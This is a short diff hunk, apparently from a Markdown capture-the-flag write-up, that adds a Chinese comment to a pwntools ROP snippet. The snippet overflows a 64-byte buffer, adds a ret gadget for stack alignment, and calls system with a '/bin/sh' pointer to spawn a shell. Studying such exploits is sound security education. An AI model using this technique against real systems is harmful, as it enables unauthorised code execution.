@@ -83,7 +83,7 @@ bss_addr = elf.bss()
 
 ```python
 rop = ROP(elf)
-rop.raw(b'a' * (64 + 8))
+rop.raw(b'a' * (64 + 8)) # 填充 64 + fake_rbp(8) 个字节的数据到缓冲区中
 rop.raw(flat(ret)) # 方式1. 加个ret即可
 rop.call(system, [bin_sh]) # 栈对齐
 
